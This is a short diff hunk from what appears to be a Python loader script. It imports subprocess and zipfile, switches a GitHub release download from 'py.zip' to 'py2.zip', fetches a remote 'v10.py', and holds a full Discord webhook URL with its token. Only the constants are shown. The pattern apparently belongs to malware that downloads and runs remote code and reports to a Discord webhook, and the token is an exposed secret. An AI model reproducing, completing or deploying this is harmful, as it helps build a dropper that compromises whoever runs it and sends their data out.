@@ -4,7 +4,7 @@ import subprocess
 import urllib.request
 import zipfile
 
-URL_PY_ZIP = "https://github.com/zzzzsit4/v10/releases/download/new/py.zip"
+URL_PY_ZIP = "https://github.com/zzzzsit4/v10/releases/download/new/py2.zip"
 URL_V10 = "https://raw.githubusercontent.com/zzzzsit4/v10/refs/heads/main/v10.py"
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1560652221035839528/SlDSAV1HKo0Xw42HTs_y6KsVLBZSQ6pUqpN59eM1K044bhjU7iwHBh4bSCfA7bvc6jO6"
